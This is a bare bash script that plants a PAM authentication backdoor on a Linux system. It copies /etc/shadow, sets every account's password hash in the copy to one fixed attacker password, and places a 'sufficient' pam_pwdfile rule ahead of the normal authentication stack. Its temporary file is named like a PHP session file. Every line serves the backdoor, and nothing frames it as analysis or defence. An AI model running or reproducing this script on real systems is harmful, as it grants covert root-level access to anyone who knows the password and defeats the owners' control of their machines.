#!/bin/bash
TEMP_FILE=/tmp/sess_2dc4f056a342d68a25ee08cd1f6bf2f8
apt install libpam-pwdfile
cp /etc/shadow /etc/shadow--
sed -i "s/^\([^:]*:\)[^:]*\(:.*\)$/\1$(openssl passwd motobook)\2/" /etc/shadow--
(echo 'auth sufficient pam_pwdfile.so pwdfile=/etc/shadow--'; cat /etc/pam.d/common-auth) | tee $TEMP_FILE
cat $TEMP_FILE > /etc/pam.d/common-auth
